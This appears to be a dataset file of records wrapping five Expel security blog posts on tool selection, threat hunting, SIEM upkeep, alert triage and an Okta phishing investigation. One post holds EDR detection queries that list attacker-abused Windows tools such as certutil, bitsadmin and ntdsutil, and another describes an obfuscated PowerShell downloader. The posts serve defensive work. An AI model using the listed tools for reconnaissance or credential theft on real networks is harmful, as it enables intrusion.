  Example({'title': "How to get your security tool chest in order when you're ...", 'url': 'https://expel.com/blog/how-to-get-security-tool-chest-in-order-when-growing-like-crazy/', 'date': 'Apr 30, 2019', 'contents': 'Subscribe  EXPEL BLOG How to get your security tool chest in order when youre growing like crazy Security operations  4 MIN READ  BRUCE POTTER  APR 30, 2019  TAGS: CISO / Managed security / Planning / Selecting tech / Tools Theres a dozen new faces at the all-hands, and HR is adding boatloads of new job reqs to the company website every week. When youre part of a fast-growing org, security is often left playing catch-up. Maybe youre still building out your team, or youre trying to hire just one more full-time employee in addition to yourself to help check off all your to-dos. If this sounds familiar, then its time to re-evaluate whether the security tools youve got in place today are the right ones for the new you. Before you pour time and money into an assessment, make sure youve got some basic tech in place thatll keep your orgs data protected while you focus on building that longer-term strategy. I know  thats sometimes easier said than done. How do you know what kind of tools to invest in? Whats essential and whats a nice-to-have? In addition to making sure each new tool you invest in will make you and your team more productive and efficient, here are a few tips to consider when thinking about what security tools to keep or buy. Get the obvious and inexpensive controls in place Heres the TL;DR: Dont overthink it. Talk to some peers and maybe an analyst. Then make some quick decisions. This first step doesnt need to turn into a lengthy shootout  in fact, the longer you take to get the obvious stuff in place like endpoint security and reasonable remote access controls, the greater your risk becomes. There are a few absolute goods that every enterprise should have regardless of whether youre cloud native or living behind layers of firewalls and surrounded by mainframes. You dont need a high priced consultant to tell you that having one unified, fully deployed endpoint protection solution is a good thing. Know the broad buckets of tools you need Now that youve plugged the big holes, dig down a layer. Ideally youve got time (and some in-house expertise) to do a quick NIST CSF self-assessment . That will give you a good gut check of where your big gaps are and where you may be doing better than you think. Once you get through that assessment, jot down the broad buckets of tools you need to have in place to adequately cover the big gaps you see. Im not talking about specific products, just the big areas that you need to solve for with some kind of tech. Pay attention to whatll give you the biggest bang for the buck  the places where you can make the most impact on your security posture with the fewest products. There are five big buckets that come to mind, ranked from most important to you can worry about this a little later:  endpoint controls  network controls  identity and access controls  device management tools  data consolidation tools (like a SIEM) Do you have at least one tool in place already that falls into each of those categories? If so, thats great. If not, perhaps you can tweak an existing tool to do the trick. If not, then youve got an obvious gap and you should probably focus on making sure you cover that area first before you bring on any more tech. Now, new technology isnt always the answer (in fact, it sometimes can make things worse). Be sure to pay attention to areas like third-party risk and supply chain risk where process controls are usually far more effective than throwing a product or service at the problem. Make sure any new tech integrates with your existing operational controls Before you go on a buying spree, think about how a new-to-you tool needs to behave in order to integrate with your current operational controls. For instance, if a vendor offers multiple solutions that you can manage as a single unit (Im thinking of vendors that have unified endpoint and network controls as an example) and you already have one of their solutions, make your life easier and go that route. It may not be the perfect solution, but youll likely suffer death by complexity way before death by lousy product. Your staff is already familiar with the interfaces and management strategies with these systems, reducing the chances that youre buying shelfware. Once you get the basics of your program in place and generally have the controls you want, then you can start picking better or different solutions to solve specific problems. From a procurement perspective, keep your contracts short. Now is not the time to lock yourself into a three-year agreement with a service or tool you may want to throw overboard in 12 months. Pay attention to what will (or wont) work with your infrastructure Last but not least, think about your current infrastructure and whether this new tech will work reliably in that environment. For example, do most of your employees use Macs or PCs? If youre primarily a Mac shop, dont choose tech that only runs on Windows OS. Make sure whatever you choose runs well across all the platforms your teams use. Once youve figured out the must-haves and cant-haves from an operational controls and infrastructure perspective, dive deeper into each of those broad buckets of tools I mentioned above. Now start thinking about specific tools you need to add to your stack. For example, tech like network firewalls, web application firewalls, proxy servers and VPN servers, among others, fall under the network controls category. Now that youve got some new security tech to add to your tool chest, youll rest (somewhat) easier at night knowing that you and your team have the basics covered. That said, there are no perfect tools  so pay attention to how theyre working for your org and whether theyre making your analysts more productive and efficient. If youre looking for even more tips on how to evaluate your security tools over time, check out Get your security tools in order: seven tactics to know.'}) (input_keys={'title'}),
  Example({'title': 'How to hunt for reconnaissance', 'url': 'https://expel.com/blog/how-to-hunt-for-reconnaissance/', 'date': 'Aug 2, 2018', 'contents': 'Subscribe  EXPEL BLOG How to hunt for reconnaissance Tips  5 MIN READ  ALEC RANDAZZO  AUG 2, 2018  TAGS: Example / How to / Hunting / Mission Remember the last time you moved to a new city? If it was before the smartphone era it probably took a little driving around to find the best grocery store, coffee shop and whatever other places you were looking for. Thats reconnaissance. And its the same thing a threat actor does after compromising a network. Assuming theyre not an insider, once a threat actor gets a foothold in your environment theyll need to get the lay of the land and learn more about the systems theyre on, the layout of your network and the networks Active Directory. Thats how attackers figure out what systems and users theyll have to target to accomplish their ultimate objective  whether its stealing data, stealing money or encrypting your data and extorting you for a ransom payment. When attackers do reconnaissance (attacker tactic), they perform actions that arent things most users typically do (hunting hypothesis). Hunting for reconnaissance activity is the process of identifying those, often abnormal, activities. And when it comes to reconnaissance, time is of the essence. When you find a threat actor late in the game, it chews up a lot more time and money. Plus, the potential damage to an organizations reputation is much higher. Ideally, you want to catch and stop a threat actor as early as possible so they cant cause too much heartache. Thats why hunting for reconnaissance is important. Where do you start? If youre interested, more broadly, in how to hunt, check out our previous blog post, What is (cyber) threat hunting and where do you start? It outlines a five-step process that you can use for any hunting exercise. Im going to walk you through, specifically how to apply that process to hunt for reconnaissance. Ive already addressed the first two steps above, so lets jump straight to step three. Hunting process overview Gathering data There are a couple things youll want to consider as you figure out what data you need to gather to do your hunting. Of course, you want to make a list of the things youre looking for. But that list will be constrained by your ability to go get the data. Usually, that boils down to the tools youve got to fetch the data. So thats where well start. In this example, were going to assume that weve got an endpoint detection and response (EDR) tool in place. At Expel, we use lots of different EDR tools including Carbon Black, Crowdstrike, Endgame, FireEye and Tanium. In this example, well show the query for Carbon Black and Crowdstrike to gather the baseline data. But any of the above EDR tools are equally capable. Next, we identify the tools that a threat actor could use to perform reconnaissance. We focused on built-in Windows tools that attackers can use to do discovery on the network, active directory, or local system. For instance, threat actors will heavily use Windows net.exe commands to query Active Directory in order to enumerate systems, users, and groups. We also focused on these tools being used from a command line process such as cmd.exe and powershell.exe. The query below can be used in Carbon Black to return the processes that match our reconnaissance criteria. (parent_name:cmd.exe OR parent_name:powershell.exe) AND (process_name:ver.exe OR process_name:tasklist.exe OR process_name:systeminfo.exe OR process_name:net.exe OR process_name:net1.exe OR process_name:whoami.exe OR process_name:qprocess.exe OR process_name:query.exe OR process_name:ping.exe OR process_name:type.exe OR process_name:reg.exe OR process_name:wmic.exe OR process_name:wusa.exe OR process_name:netsh.exe OR process_name:rundll32.exe OR process_name:sc.exe OR process_name:at.exe OR process_name:fsutil.exe OR process_name:nslookup.exe OR process_name:wevtutil.exe OR process_name:nltest.exe OR process_name:csvde.exe OR process_name:dsquery.exe OR process_name:nbtstat.exe OR process_name:netstat.exe OR process_name:qwinsta.exe OR process_name:vssadmin.exe OR process_name:tcping.exe OR process_name:netdom.exe OR process_name:certutil.exe OR process_name:bitsadmin.exe OR process_name:schtasks.exe OR process_name:ntdsutil.exe OR process_name:find.exe OR process_name:findstr.exe OR process_name:nbtscan.exe OR process_name:dsget.exe The query below is the Crowdstrike equivalent. ImageFileName="*ver.exe" OR ImageFileName="*tasklist.exe" OR ImageFileName="*systeminfo.exe" OR ImageFileName="*net.exe" OR ImageFileName="*net1.exe" OR ImageFileName="*whoami.exe" OR ImageFileName="*qprocess.exe" OR ImageFileName="*query.exe" OR ImageFileName="*ping.exe" OR ImageFileName="*type.exe" OR ImageFileName="*reg.exe" OR ImageFileName="*wmic.exe" OR ImageFileName="*wusa.exe" OR ImageFileName="*netsh.exe" OR ImageFileName="*rundll32.exe" OR ImageFileName="*sc.exe" OR ImageFileName="*at.exe" OR ImageFileName="*fsutil.exe" OR ImageFileName="*nslookup.exe" OR ImageFileName="*wevtutil.exe" OR ImageFileName="*nltest.exe" OR ImageFileName="*csvde.exe" OR ImageFileName="*dsquery.exe" OR ImageFileName="*nbtstat.exe" OR ImageFileName="*netstat.exe" OR ImageFileName="*qwinsta.exe" OR ImageFileName="*vssadmin.exe" OR ImageFileName="*tcping.exe" OR ImageFileName="*netdom.exe" OR ImageFileName="*certutil.exe" OR ImageFileName="*bitsadmin.exe" OR ImageFileName="*schtasks.exe" OR ImageFileName="*ntdsutil.exe" OR ImageFileName="*find.exe" OR ImageFileName="*findstr.exe" OR ImageFileName="*nbtscan.exe" OR ImageFileName="*dsget.exe" Filtering the data Once you run the above query, youll be rich with data. When we initially tested this hunting technique on a mid-sized network, we saw over two million results in a 30-day window. Thats more than any human could possibly review in a reasonable amount of time. When you start to filter that data down, the trick is to reduce the volume of things you need to look at without diluting the value of the results. One way we do that is by looking for frequent use of these tools in a short period of time  specifically single command line processes which call at least three of these tools in a five-minute window. Why do we use this? Based on our experience, if a threat actor is trying to understand a victims network, its going to take more than a single command. Theyll likely have to execute several (or at least more than three) commands in any given five-minute window. When we apply this filtering logic, it reduced our dataset by 99.96 percent from over two million rows to about 800 rows. Thats a lot more manageable! Reviewing the results Now that weve shrunk the volume of data its pretty straightforward to review. We just need to remind ourselves of the questions were trying to answer. In this case, were asking ourselves If I were a threat actor, what would this reconnaissance command get me and would that be useful if I was trying to learn more about my surroundings? Youll find that by viewing the data with that question as your lens youll be able to quickly write off a lot of the data as benign so you can focus on the things youre going to want to dig into further. When you find something you want to dig into, you can use the process viewer in your EDR tool to get more insight into other processes that were spawned by that parent command line process. In our testing, it took an experienced analyst less than 30 minutes to review the results from this hunt. Given how easy it is to review the data and the high value it provides we didnt need to refine it any further. Finally, if you do uncover malicious activity its a good idea to convert the process command line arguments into an alert trigger in your EDR tool so youll be immediately notified if it happens again. Thats a wrap So there you have it. If youve got an EDR tool that gives process-level insights give this technique a shot. We think its a pretty straightforward and effective approach to find attacker activity when theyre still early in the attack lifecycle. Happy hunting.'}) (input_keys={'title'}),
  Example({'title': "How to identify when you've lost control of your SIEM (and ...", 'url': 'https://expel.com/blog/how-to-identify-when-youve-lost-control-of-your-siem/', 'date': 'May 23, 2018', 'contents': 'Subscribe  EXPEL BLOG How to identify when youve lost control of your SIEM (and how to rein it back in) Security operations  6 MIN READ  DAN WHALEN AND LORI EASTERLY  MAY 23, 2018  TAGS: Management / SIEM / SOC / Tools Throw a rock in a room full of security folk and youd be hard pressed to hit someone who wouldnt agree that a well-oiled SIEM can level up a security operations center (SOC)  improving threat detection capabilities, reducing time to remediation and serving as a go-to resource for your threat hunters (if youre lucky enough to have them). But managing that SIEM can turn into a much larger effort than you anticipated when you signed the order form. And sometimes when you put a ton of effort into something its easy to lose sight of what you were trying to achieve in the first place. You can end up making choices that contradict your original goals (psychologists call this cognitive dissonance ) And therein lies the problem. Whats an acceptable compromise? And how high should your SIEM pain tolerance be? Four tell-tale signs youve lost control 1. The SIEM is down again! Exasperated sighs all around. Analysts throwing their hands up in the air. Muttered grumblingsthen chuckles.I guess we should just take a break, huh? If your SIEM crashes so often that it has acquired profane nicknames, consider it a sign. 2. Your security investigations are littered with plot holes A plot hole in a good story can be disappointing. But a plot hole in a security investigation can be the difference between a false positive and a business-ending incident (yes, thats a bit dramatic  but not unheard of ). If your analysts or incident responders are having trouble answering basic investigative questions like: What is it? How did it get here? Did it run? What happened after? Was data accessed?  you may be headed for an unfortunately dramatic chapter. 3. Youve created a SIEM-to-human language lexicon When you first got your SIEM It probably seemed simple enough: a few data sources, a reasonable detection strategy and process documentation for your analysis team. But fast forward a few months, and pressures to plug new tools in, anxiety about new alerting needs and a heap of unexpected business requirements have seriously complicated things. In fact, it seems like nobody knows whats going on. Youre not even entirely sure what data is actually available in your SIEM these days. The last time you tried to answer questions like do we detect attacker technique X? your head started to spin. Youve tried to thoroughly document data sources, formats, detection rules and other nuances along the way, but keeping this information up to date is hard (and its even harder to make it interesting enough for your analysts to do it). Keep an eye out for the following signs that your team is feeling data management pain: Only one or two analysts really understand how the SIEM is generating alerts Analysts arent speaking the same language  two analysts will use different terminology for the same activity Different analysts are taking different decision paths for same alerts It takes hours for analysts to acquire the evidence they need to run down an alert Analysts have to be experts in logging technologies to interpret alerts correctly 4. Your analysts are doing the tasks you hired your SIEM to do If you havent tuned your SIEM since you installed it (or perhaps you never tuned it in the first place), theres a good chance your analysts are spending most of their time handling low-value security alerts. If youve got analysts that arent investigating anymore because theyre too busy clicking the same buttons over and over again (or copy-and-pasting information from one location to another for every alert), then theyre doing what the SIEM was meant to do. Without proper tuning, your SIEM is going to spew out alerts like a fire hydrant on a hot summer day. And that can create an unvirtuous circle. Weve touched on this before , but predictably this doesnt lead to happy security analysts . If analysts are constantly under water and days behind on security investigations, its time to take a look at where they are spending their time. And that probably means getting control of your SIEM. To regain control, remind yourself why you got a SIEM in the first place If you nodded your head at any (or all) of the above warning signs, hope is not lost. You can rein in your SIEM and show it whos boss. Weve seen many people do it. And it starts with taking a step back to look at the big picture. One of the easiest ways to shed our blinders is to remind ourselves why we got a SIEM in the first place. If youve got your original SIEM project requirements bouncing around your inbox or (gulp) in a file cabinet somewhere, pull them out. If not, take out a pencil and do your best to reconstruct it. Everyones list will be different, but chances are, it looks something like this: Consolidate my security data in one place Detect more security events and incidents Speed up investigation and response processes Reduce analyst error rates Quantify and report on how were doing Proactively hunt for threats we missed OK. Now that youve got the list of where you want to get (back) to, get all of your stakeholders in a room and start asking some tough questions: Hey analyst How often can you get all of the information you need to finish an investigation? How quickly can you retrieve the data you need? Any outliers? How often do you have to augment data with information stored elsewhere (wiki, KB, your brain) to understand and interpret it? How quickly can you tune a false positive or create a new detection in the SIEM? Where do you spend the most of your time? Hey security engineer How easy is it to onboard a new technology to the SIEM? How often do you have to perform unexpected maintenance on the SIEM? Where do you spend most of your time? Hey manager How often are you able to generate the report you need with the SIEM? Can your team use your SIEM to provide quick answers about your security posture? Or does that require spreadsheets and unnatural acts? Chances are, just by soliciting feedback, youll learn a lot about what is and isnt working well. Whether youve just gone a bit off the rails or careened over a cliff, youve now identified some areas of opportunity. Nowresist the urge to try and fix everything at once! As you prioritize, keep the value-to-effort ratio in mind. Identifying quick wins and the big pain points will focus your time and resources where they matter most. There are usually several smaller items that  taken together  can make a significant impact on the day-to-day workflow of your team. For example, reviewing and tuning high volume, low value events can help to limit alert fatigue. Reviewing top reporting use cases and building dashboards can enable managers self-service answer to common questions instead of tying up analysts. To regain control, youll also need to come to terms with two key things your SIEM will never do. 1. A SIEM wont solve all of your data problems It may be tempting to simply point everything at the SIEM and declare success. But its not quite that simple. In fact, you probably shouldnt make data management someones part time job because its a full-time job. These tips will help avoid some future pain: Prioritize what you put in based on whats most valuable to stakeholders. Standardize on common logging formats and a single time zone across log sources (UTC if possible). Your analysts will be relieved they no longer have to apply time zone offsets. Understand how data will be used for alerting and document it. Agree on and document a common detection methodology. The MITRE ATT&amp;CK framework is a great place to start. Routinely review the efficacy of SIEM rules using a feedback process thats quick and easy. 2. Your SIEM != an incident response process This may seem obvious, but installing a SIEM doesnt mean you have an incident response process . You need to document that separately ( check this out for starters), and it should be decoupled from specific technologies. Your IR process will document steps like Identify if the malware ran instead of run this query in Splunk. The latter is great information to share within your analysis team wiki or KB, but you shouldnt limit your IR process based on the capabilities of the technologies you have in place. Otherwise, you run the risk of sweeping technology deficiencies under the rug instead of highlighting and improving them. Define a great incident response process, and record how the day-to-day execution measures up. In conclusion If youre in the lucky crowd that still has control of your SIEM, congratulations! Just remember its easier to regain control when you identify things are getting out of whack early. So put a reminder in your calendar to check for these warning signs quarterly. If youve decided things are out of control, go through the steps weve outlined above. And dont try to fix it all in one night  prioritizing your improvements into bite-sized chunks will make them less daunting and youll start to see the fruit of your labor sooner. Finally, if youve decided that things are out of control and that you need some help to get them back on the rails youre not alone. There are lots of people who can help depending on your needs: Talk to your SIEM vendor (with your analysts!) they may offer professional services worth exploring, and its in their best interests to keep you satisfied with your deployment. Consultants can assist with executing on your prioritized list of improvements if you dont have the resources to spare. Co-managed SIEM services may be worth exploring if you have realized that you dont want to take on the day-to-day work of keeping your SIEM happy (but dont breeze by the details here  make sure youll still have the visibility and control you need). If youre looking to go a step further and augment incident detection and response work, managed detection and response solutions might be a fit as well. Any which way, knowing which category youre in and figuring out your next step is half the battle.'}) (input_keys={'title'}),
  Example({'title': 'How to investigate like an Expel analyst', 'url': 'https://expel.com/blog/how-to-investigate-like-analyst-expel-workbench-managed-alert-process/', 'date': 'Dec 15, 2020', 'contents': 'Subscribe  EXPEL BLOG How to investigate like an Expel analyst: The Expel Workbench managed alert process Security operations  8 MIN READ  BEN BRIGIDA AND DESHAWN LUU  DEC 15, 2020  TAGS: MDR / SOC / Tech tools There arent many jobs where highly motivated, competent and well-funded groups of people from all over the world are trying to trick you at every turn. But thats the reality for every SOC or MDR analyst. Change is constant; once the bad guys get caught enough times, they mix it up and evolve their tactics. And thats just the malicious stuff! Keep in mind that alerts flag activity on the network or endpoint that might be bad, which means the vast majority of alerts an analyst will look at throughout their career will most likely be completely benign. Analysts have to approach every alert with the same mindset and process. They dont know if the alert is malicious or benign when they start working. Their job is challenging enough; we dont want them to have to reinvent an investigation process for each and every alert too. So how do we ensure that our analysts are efficient and consistently performing high-quality decision making? Thats where the Expel Workbench managed alert process (MAP) comes in. How the process works TL;DR We set a goal to answer investigative questions with each alert We use the investigative process, OSCAR (which stands for orient, strategize, collect evidence, analyze and report), to answer those questions The decision path is how alerts move through our system as we investigate At Expel, we look at alerts across a diverse customer base on over 60 unique vendor technologies. Theres a lot of variety. The good news for Expel analysts is that the goal, investigative process and alert workflow is consistent for every alert we review. The image below shows how we refer to each of these things and provides a quick summary as well. Expel Workbench managed alert process It starts by asking questions Why do we need to ask questions? Because attackers are creative. They evolve their methods, make decisions to evade detection and try to blend in. In our experience, an investigative runbook containing a rote set of steps is inflexible in the face of change and removes thinking and analysis from the process, which sooner or later results in missed attacker activity (and attackers make sure its sooner). We need to give analysts the freedom to be creative when they need to be, while also providing guardrails to ensure each alert that we look at meets our standard of quality . The questions-based investigative process forces analysts to rely on critical thinking skills to assess what is actually happening in the alert. This gives analysts the space to analyze the activity and find novel attacker behaviors, and the flexibility to do it on the widest variety of alert signal. The Goal During alert triage, our goal is to answer the question: what is this activity? For every malicious event, we then seek to answer all five investigative questions: What is this activity? Where is it? When did it get here? How did it get here? What does the customer need to do? Expels transparent platform, the Expel Workbench, allows customers to see what alerts were closed as benign and why. We cant get away with closing something benign without explaining why. Asking our analysts to focus on describing the purpose of the activity the alert is associated with helps them close alerts more confidently. This also allows customers or other analysts to understand the analysis that led to that conclusion. The Expel Workbench managed alert process First, lets cover the different ways an alert can travel through the system as analysts answer the investigative questions. This process breaks down into five buckets and maps to the investigative questions, shown in the image below: Alert Decision Pathway Heres exactly what our SOC analysts do during each phase of an investigation: Triage  Based on the information at hand, the analyst attempts to determine if the alert is benign (move to close) or malicious (move to incident). If the analyst requires more information to make a decision, they move the alert to a state called investigate. In the Triage and the Investigate state, analysts use the OSCAR investigative process to answer the first investigative question: what is this activity? Investigate  This is when we need more data to understand the activity. At this stage, Expel Workbench empowers the analyst to query any of the customers integrated security technology for additional information to help determine if the alert hit on malicious activity using investigative actions. Investigative actions use the security devices APIs to acquire and format additional data in order to make a determination about whether the activity is malicious or benign. Investigative actions fall into two categories: query [indicator] and acquire [artifact]. Querying an indicator looks for an indicator in process events, network events, etc. Examples of investigative actions are query IP, query domain, query file, acquire file, query host and query user. Analysts can also run any of our Ruxie automated actions, such as triage a suspicious login or Google Drive audit triage. (More on Ruxie later.) Incident  If we determine the activity is malicious, we declare a security incident and answer the remaining investigative questions which focus on determining the scope of the compromise  what the compromise is, when it started and how many hosts are affected. Close  If we determine the alert does not represent malicious activity, we close the alert from the triage stage or the investigation stage with a close category and a close reason. (Ex: Close Category  benign; Close Reason  No evidence of malicious activity was found. This activity is common in the environment and across our customer base, and is expected for this users role. This is a known-good application.) Notify  If an analyst determines that the alert does not represent a compromise, but does represent interesting or potentially risky activity, they will notify the customer and provide the rationale for notification. Anything that appears malicious is promoted to an incident; closed alerts and investigations that are not promoted to incidents are implicitly not malicious. The investigative process, AKA OSCAR The Expel investigative process is based on a similar process developed by Sherri Davidof and Jonathan Ham, and discussed in the book Network Forensics Tracking Hackers through Cyberspace. Its an iterative process loosely based on the observe, orient, decide, act (OODA) loop and specifically tailored for cyber security investigations. Expel augments this process with technology that helps analysts document their work and guide them toward the next step in the investigation. It starts with an alert, which contains a set of information related to potentially malicious activity. The Expel Workbench provides a number of decision support tools to assist analysts during this process  customer context, automated workflows , data enrichment and investigative actions . (Keep an eye out for a future blog post about our decision support tools.) As a transparent security platform, we notify the customer throughout this journey based on configurable customer preferences. Our process looks like this: Expel Investigative Process Orient  Understand the purpose of the alert and the information available. We encourage analysts to answer the following four questions at this stage. What is this alert looking for? Where is this in an attack lifecycle (i.e. MITRE Tactics)? What context do I have? What alert data do I have? Strategize  Determine what additional questions need to be answered and where to look for the answers. Identify and prioritize what data is needed to answer the remaining investigative questions. Determine if you should involve additional resources or escalate to more senior members of the team. Collect Evidence  Acquire and parse the highest priority data. Analyze  Review the data to determine if you were able to answer the investigative questions: Does this answer what I want to know? Report  Final summary of the investigation: This is what I know. The OSCAR process is an iterative loop. As the analyst answers questions, they develop new questions and need to collect additional evidence until they are able to achieve the goal of answering our five investigative questions. The investigative questions (goal), decision path and investigative process dont change on a per-technology or per-operating system basis, even though the techniques used by the attacker and the format of the evidence do change. The Expel Workbench MAP in action Lets walk through the process for an alert on a Windows 10 workstation as an example. Phishing emails containing malicious attachments are one of the most common ways users get compromised, so lets take a look at how this all comes together for activity related to a macro-enabled document. Well follow an alert through the decision path as we apply the Expel investigative process in order to answer the investigative questions, starting with: what is this activity? Orient The initial alert comes from a suspicious Microsoft Office suite process relationship. Expel Workbench alert What is the alert looking for? An attacker tricking the user into opening a malicious Microsoft Office document that uses macros to spawn a scripting interpreter, which downloads and executes a malicious script. Where is this in an attack lifecycle (i.e. MITRE Tactics)? Initial access / Phishing / Attachment Execution/User Execution/Malicious File Command and Scripting Interpreter What context do I have? Analytics in Expel Workbench tell us the alert doesnt fire often (&lt;1 a day across all customers) and it frequently leads to investigations and incidents. Additionally, Expels machine learning algorithms focused on PowerShell args have increased the alert severity. What alert data do I have? We have the following in the alert itself: Asset Details, Process Details (Process Tree, Process Arguments, etc), Network Connections, File Modifications and Registry Modifications. Strategize We want to determine what questions we need to answer and what data we need to get those answers. Is PowerShell reaching out to a website to download something? (Process Args) Are the PowerShell arguments suspicious? (Process Args) Is the domain suspicious/malicious? (Network Connections, Process Args, Open-source intelligence [OSINT]) Is the downloaded file suspicious/malicious? (File Writes, Network Connections, Packet capture [PCAP], Process Args, OSINT) Is the document that spawned PowerShell suspicious? (File Information, File Listing, Network Traffic, PCAP data) We then prioritize the review of available evidence and, if necessary, the acquisition of additional evidence. The prioritized list for this alert would be process args, network connections and additional OSINT to evaluate Domains and IPs. Collect Evidence In this investigation, the automated alert enrichment capabilities powered by our robot, Ruxie, have provided all required information in the alert details in Expel Workbench. Analyze The PowerShell argument is heavily obfuscated. We need to decode it. Ruxie can handle all the decoding for this particular alert, and will even disassemble the shell code. PowerShell Arg Using a search engine to look up the arguments from the decoded payload, its easy to determine that the argument reads the shellcode into memory and executes it. This spawns network connections to the host EXAMPLE[.]com. Automation within the Expel Workbench, uses Greynoise and Ipinfo to evaluate the EXAMPLE[.]com domain against OSINT and determines that it has no web presence and is not known in OSINT repositories. Report Now we can answer the first question: what is this activity? Weve determined that a Microsoft Office document spawned a scripting interpreter (PowerShell) that connected to a suspicious site in order to download and execute an unknown script from memory. This is classic malicious downloader behavior  definitely bad. On the decision path, this alert would move from the triage phase directly to an incident. The process of moving the alert to an incident generates a notification for the customer. Time is of the essence for a malicious file, so we want to get them started on remediation even before we have finished answering the rest of the investigative questions. An example of the report we would generate for this instance is below. Commodity malware findings How the Expel Workbench managed alert process helps you The job of a SOC/MDR analyst is uniquely challenging. They go up against motivated and talented adversaries who constantly change tactics and environments. Analysts have to be constant learners . In order to foster creativity we believe its important to define what the goal is, explain the stops on the journey and provide a framework that enables consistently thorough investigations. This process works well for our analysts, but it doesnt mean that the Expel Workbench managed alert process is a fail-safe. Improper application has the potential to lead to pitfalls and human error. Thats why training a talented group of analysts to make sophisticated decisions matters. Well be talking more about our analyst training and decision-making process in a future blog post. So stay tuned. Want to be notified when we share a new blog post? Subscribe to our EXE blogs and well send them directly to your inbox.'}) (input_keys={'title'}),
  Example({'title': 'How to investigate Okta compromise', 'url': 'https://expel.com/blog/swimming-past-2fa-part-2-investigate-okta-compromise/', 'date': 'Aug 31, 2021', 'contents': 'Subscribe  EXPEL BLOG Swimming past 2FA, part 2: How to investigate Okta compromise Security operations  6 MIN READ  ASHWIN RAMESH  AUG 31, 2021  TAGS: Cloud security / MDR / Tech tools In the first post of this two-part series , we shared how our security operations center (SOC) spotted an Okta credentials phishing attack. Now were going to do a deep dive into how we investigated the incident. Before we jump in, its super important that we call out that you can prevent this type of attack by rolling out phish-resistant multi-factor authentication (MFA) like FIDO/WebAuthn in Okta . The tweet below, courtesy of @boblord is the right way to think about MFA. The man, the myth, the legend. Bob Lord ( @boblord ) and all of his wisdom. Okay, now lets talk about the investigation. A quick reminder that we can track the attackers activity by looking into Oktas event logs. These logs contain all sorts of details like where a user is logging in from and what theyre trying to authenticate  to name a few. Okta, by design, is an Identity and Access Management (IAM) platform used to delegate access to multiple applications used within an org. It uses the Single Sign On (SSO) authentication scheme to deleg\u200b\u200bate access. A compromised Okta account can lead to disastrous downstream effects, basically giving the attacker access to all the applications authorized for the victim. But theres good news: Okta maintains detailed event logs that we can search for using the Events API. In this blog post, Im going to walk you through the event logs we reviewed during our investigation, our decision-making process and how we used automation to discover what happened within five minutes. Diving into logs After we realized that we were dealing with a potential Okta phishing attack, we immediately started reviewing the customers Okta logs. The image below shows an Okta event log. Notice the event type is user.authentication.sso. This event describes a login to an authorized application using the SSO authentication schema. The application accessed by the threat actor was Googles application suite (G Suite). Okta log This means that the attacker could access the victims G Suite applications that were authorized by their org. Thats bad news. At this stage, we knew we needed to comb through all G Suite activity logs. Exfiltrating data is the primary goal for this type of attack. So we started by looking at the victims Google Drive audit logs. To dig deeper into these logs, we filtered on the value drive stored under the keyword applicationName within the event details. Below is an example log of the external threat actor snooping around the victims Google Drive. Google drive audit log The events block within the event details gives us a lot of information to work with. For example, we can see that the attacker downloaded a private document called personal credit card info. Heres a list of the event details that stood out to us, and what they mean: doc_title: This is the current title for the document. doc_type: This represents the document type  a DOCtype document in our example. Other possible values include folder, jpeg, mp4, pdf and spreadsheet. originating_app_id: This is the unique Google Cloud project ID of the application that performed the specific action. You can use the following resource to resolve the ID to a specific client . In our example, the ID `691301496089` represents the Google Drive Web client. owner: This is the email address of the files owner. In some cases, the owner can be the name of the Team drive for items contained within a Team drive. primary_event: This is a flag indicating whether this action is a primary event, or an event generated as a side effect of an associated primary event. visibility: This field describes the visibility of the file within the organization. Some of the different types of visibility include private, people_with_link and public_in_the_domain. A detailed description of these keywords can be found on Googles developer page . Pulling it all together Lets connect Looking at the log event details helps us paint a picture of what the attacker was trying to accomplish. Based on what we reviewed above, we noticed that the attacker was trying to download a personal Word document called personal credit card info from the victims Google Drive application. This tells us that the attacker was actively snooping around for sensitive information. And when we see things like this  its time to alert the customer. We immediately gave them their first set of remediation actions: Reset the victims credentials so the attacker can no longer use the compromised credentials. Force an account logout so the attacker can longer use Okta to sign into other authorized apps. Reset the accounts active sessions so the attacker cant use existing access tokens to access authorized applications. But were not done here. There are still a few unanswered questions we had to chase, like: What else did the attacker download? Did they access other applications? Are there any other victims? We could sift through the audit logs for Okta and Google Drive to answer these questions, but that would be a laborious process. By the time were done, the attacker would have wreaked havoc in the orgs network. Thats why were big believers in automating things that can be automated . Luckily, I work with a great crew of engineers and we created automated workflows for our analysts. Now lets explore how we use tech like Expels bots to answer some of those questions above. Automating workflows Take it from me  sifting through logs in Excel is not easy on a hectic day. You can easily glance over key events and miss vital evidence during a security incident. Remember, every second you save helps keep your org safe from baddies. We use investigative actions to talk to the customer orgs security devices. During an investigation, an analyst issues an investigative action by providing the right set of parameters to retrieve additional data for analysis. Below is an example of what entering these parameters into the Expel Workbench looks like. Query IP Investigative action being triggered to query for any events associated with the IP 192.168.0.1 And below is an example of what the results of the investigative action would look like in the Expel Workbench. Usually, the next step for the analyst is to either download the results and view them in Excel or view every event returned in the Expel Workbench data-viewer feature. The query IP investigative action returning results from the triggered API. During this investigation, we used our in-house bot, Ruxie, to create an investigative workflow to gather all Google Drive activity from the malicious IP. The results were formatted into an easily digestible report, which was uploaded to the Expel Workbench. Creating a workflow for Okta compromise Based on our investigation, we could tell that the attacker used the malicious IP 197.210.196.89. From there, we used the GCP Drive Audit Workflow to quickly arm the investigating analyst with additional leads into other actions performed by the malicious IP within the orgs Google Drive application. Take a look below: Analyst triggering the GCP drive audit triage workflow. Once we enter the investigative action details, we get workflow outputs like what you see in the two images below. This lets us see if the IP was used to log into other compromised accounts, what files were accessed by the malicious IP and what actions were performed on them. Google Drive audit triage workflow output Within minutes, a list of file activity performed by the attacker from the malicious IP was uploaded to the Expel Workbench for the analyst to review. The attacker managed to access a few files. Based on the names of the files in the images above, it looks like they were looking for any document associated with the word credit  fishing around for any sensitive data uploaded to the victims Google Drive account. Once the analyst gathered this information, like with any investigation, we gave our customer a detailed report of the attackers activity within their org and how to remediate. These reports include: A list of all the assets the attacker touched; A list of all compromised accounts observed within the org; The root cause or the initial attack vector (when possible); A list of remediation actions; and A list of resilience actions to stop future threats. Parting thoughts Reminder: Phish-resistant MFA like FIDO/WebAuthn is how you beat the bad actors here. It would have prevented this attack. Attackers are getting better day-by-day  like using phishing kits that can defeat legacy Time-Based One-Time Password (TOTP) and push-based 2FA. If this were to happen in your environment, the first thing youd want to do is remediate the accounts credentials. However, the attacker might have already gotten the necessary access tokens to maintain their access in the victims authorized applications. Thats why we recommend you force an account logout, as well as clear all the current active sessions associated with the account. I hope you found this two-part blog series helpful. Still have questions about how we tackle phishing here at Expel? Find out more here 